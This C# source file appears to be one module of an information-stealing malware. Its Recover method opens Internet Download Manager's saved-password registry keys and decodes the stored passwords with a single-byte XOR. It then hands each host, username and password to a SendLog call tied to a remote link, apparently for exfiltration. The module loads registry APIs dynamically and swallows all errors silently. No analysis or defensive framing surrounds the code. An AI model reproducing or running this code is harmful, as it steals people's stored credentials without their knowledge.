using System;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

public class InternetDownloadManager
{
	public class SafeKeyHandle : SafeHandle
	{
		public override bool IsInvalid => handle == IntPtr.Zero;

		public SafeKeyHandle()
			: base(IntPtr.Zero, ownsHandle: true)
		{
		}

		protected override bool ReleaseHandle()
		{
			return NativeMethods.RegCloseKey(handle) == 0;
		}
	}

	[SuppressUnmanagedCodeSecurity]
	public class NativeMethods
	{
		public delegate int RegOpenKeyExAParameters([In] IntPtr hKey, [In] string subKey, int options, [In] int samDesired, out SafeKeyHandle phkResult);

		public delegate int RegCloseKeyParameters(IntPtr hKey);

		public delegate int RegQueryValueExParameters([In] SafeKeyHandle hKey, [In] string lpValueName, int reserved, out int type, [Out] byte[] data, [In][Out] ref int dataSize);

		public static readonly RegOpenKeyExAParameters RegOpenKeyEx = Dynamic.CreateApi<RegOpenKeyExAParameters>("Advapi32", "RegOpenKeyEx");

		public static readonly RegCloseKeyParameters RegCloseKey = Dynamic.CreateApi<RegCloseKeyParameters>("Advapi32", "RegCloseKey");

		public static readonly RegQueryValueExParameters RegQueryValueEx = Dynamic.CreateApi<RegQueryValueExParameters>("Advapi32", "RegQueryValueEx");
	}

	public static void Recover()
	{
		string text = "Software\\DownloadManager\\Passwords\\";
		_ = Environment.NewLine + "Program: Internet Download Manager >6 " + Environment.NewLine + Environment.NewLine;
		IntPtr hKey = new IntPtr(-2147483647);
		checked
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text);
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string text2 in subKeyNames)
				{
					registryKey.OpenSubKey(text2);
					SafeKeyHandle phkResult = null;
					NativeMethods.RegOpenKeyEx(hKey, text + text2, 0, 131097, out phkResult);
					byte[] array = new byte[257];
					byte[] array2 = new byte[257];
					NativeMethods.RegQueryValueExParameters regQueryValueEx = NativeMethods.RegQueryValueEx;
					SafeKeyHandle hKey2 = phkResult;
					int type = 0;
					byte[] data = array;
					int dataSize = 256;
					regQueryValueEx(hKey2, "User", 0, out type, data, ref dataSize);
					NativeMethods.RegQueryValueExParameters regQueryValueEx2 = NativeMethods.RegQueryValueEx;
					SafeKeyHandle hKey3 = phkResult;
					dataSize = 0;
					type = 256;
					regQueryValueEx2(hKey3, "EncPassword", 0, out dataSize, array2, ref type);
					int num = 0;
					string host = text2;
					int num2 = array.Length - 1;
					for (int j = 0; j <= num2 && array[j] != 0; j++)
					{
						num++;
					}
					array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[num - 1 + 1]);
					string @string = Encoding.Default.GetString(array);
					num = 0;
					string text3 = null;
					int num3 = array2.Length - 1;
					for (int k = 0; k <= num3 && array2[k] != 0; k++)
					{
						text3 += Conversions.ToString(Strings.ChrW(array2[k] ^ 0xF));
					}
					string password = text3;
					Send.SendLog(KidMode.P_Link, "Passwords", null, null, "IDM", host, @string, password, null);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
